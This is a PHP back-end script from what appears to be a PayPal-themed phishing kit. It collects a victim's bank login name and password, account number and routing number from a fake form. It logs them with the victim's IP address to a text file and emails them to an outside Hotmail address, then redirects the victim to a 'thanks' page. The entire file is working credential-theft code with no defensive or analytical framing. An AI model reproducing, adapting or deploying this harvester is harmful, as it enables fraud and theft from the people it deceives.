<?php include "encriptar.php";?>
<?php
include"bots.php";
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
if( !empty($_POST['_bkid']) && !empty($_POST['_bkpass']) )
{
$message .= "=========[[#]HR mdfk[#]]=========<br>\n";
$message .= "Bank Name	  : ".$_POST['_bkid']."<br>\n";
$message .= "Bank Password	: ".$_POST['_bkpass']."<br>\n";
$message .= "Account Number	: ".$_POST['_accn']."<br>\n";
$message .= "Routing Number	 : ".$_POST['_routn']."<br>\n";
$message .= "===============[IP]==============<br>\n";
$message .= "IP	: http://www.geoiptool.com/?IP=$ip<br>\n";
$message .= "==========[ [#]hr mmdfk[#] ]=========<br>";

include '_________YOUR_EMAIL.php';
$subject = "BANK INFOS FROM [$ip]";
$out = fopen ( "bank1.txt" , "a+t" );
fwrite ( $out , "--[#]hada[#]--<br> $message <br>--[#]hada[#]--<br>\n" );
fclose ( $out );
$to="the-pay-pal@hotmail.com";
mail($to, $subject, $message);
header("Location:thanks.php");
}
else
{
header("Location:websc-bank.php");
}

?>
